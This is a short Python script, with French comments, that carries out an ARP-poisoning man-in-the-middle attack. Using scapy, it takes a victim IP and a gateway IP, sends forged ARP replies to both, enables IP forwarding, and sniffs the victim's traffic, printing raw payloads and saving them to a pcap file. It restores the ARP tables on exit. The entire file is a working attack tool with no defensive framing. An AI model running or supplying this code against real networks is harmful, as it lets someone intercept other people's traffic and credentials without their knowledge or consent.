#!/usr/bin/env python
# -*- coding: utf-8 -*-


#################################################
#Auteur: Vikrant SINGH                          #
#Programme: ARP Poisoning                       #
#                                               #
#################################################


#################################################
#####################Imports#####################

from Tkinter import *
from scapy.all import *
import sys
import os
#################################################



interface = raw_input("interface réseau :")
ipvictime = raw_input("IP de la victime:")
iprouteur = raw_input("IP du routeur GW :")


def get_mac(ip):
    ans, unans = arping(ip)
    for s, r in ans:
        return r[Ether].src


def poison(iprouteur, ipvictime):
    victimMAC = get_mac(ipvictime)
    routerMAC = get_mac(iprouteur)
    send(ARP(op =2, pdst = ipvictime, psrc = iprouteur, hwdst = victimMAC))
    send(ARP(op = 2, pdst = iprouteur, psrc = ipvictime, hwdst = routerMAC))

def restoration(iprouteur, ipvictime):
    victimMAC = get_mac(ipvictime)
    routerMAC = get_mac(iprouteur)
    send(ARP(op = 2, pdst = iprouteur, psrc = ipvictime, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4) 
    send(ARP(op = 2, pdst = ipvictime, psrc = iprouteur, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)

def sniffer():
    pkts = sniff(iface = interface, count = 10, prn=lambda x:x.sprintf(" Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
    wrpcap("temp.pcap", pkts)


def MiddleMan():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    while 1:
        try:
            poison(iprouteur, ipvictime)
            time.sleep(1)
            sniffer()
        except KeyboardInterrupt:
            restoration(iprouteur, ipvictime)
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            sys.exit(1)


if __name__ == "__main__":
	
	MiddleMan()
